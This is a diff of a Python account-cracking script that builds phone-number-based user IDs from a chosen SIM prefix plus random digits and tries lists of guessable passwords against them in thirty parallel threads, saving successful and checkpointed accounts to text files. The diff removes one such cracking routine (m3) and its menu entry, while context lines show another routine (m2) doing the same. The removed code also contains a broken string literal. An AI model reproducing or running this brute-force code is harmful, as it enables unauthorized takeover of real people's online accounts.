@@ -174,8 +174,6 @@ def annu():
     	m1()
     if zoomv4 =='2':
     	m2()
-    if zoomv4 =='3':
-    	m3()
     if zoomv4 =='0':
     	tech()
     else:
@@ -251,43 +249,6 @@ def m2():
             uid = kode+guru
             pwx=[guru,'khankhan','khan12345','khan12','khan786']
             yaari.submit(rcrack,uid,pwx,tl)
-    print(46*'-')
-    print('[✓]Total Idz saved : OK [Ok.txt] | CP [CP.txt]')
-    print(46*'-')
-    print('[+]The Process Has Been Complete')
-    print('[=]Press Enter to Back');tech()
-#
-def m3():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print('[+] Example  : 92345,92318,92334,...')
-    print('\x1b[1;91m[+] Now Select Sim Code ')
-    lines()
-    kode = input('[+] Your Code : ')
-    lines()
-    os.system('clear')
-    print(logo)
-    print('[+] Example  : 1000,5000,100000,...')
-    print('\x1b[1;91m[+] Now Select Idz Limit  ')
-    lines()
-    limit = int(input('[+] Idz Limit : '))
-    print(46*'-')
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print(' [+] Total Idz : '+tl)
-        print(' [+] Selected Code :\x1b[1;92m '+kode)
-        print('\x1b[1;91m [=] Crack started...,CTRL+C to stop the process...')
-        lines()
-        for guru in user:
-			uid = kode+guru
-			pwx = [guru,123',kode+'1234','Pakistan','i love you','love123','khan789','mohummed']
-			yaari.submit(c,uid,pwx,tl)
     print(46*'-')
     print('[✓]Total Idz saved : OK [Ok.txt] | CP [CP.txt]')
     print(46*'-')
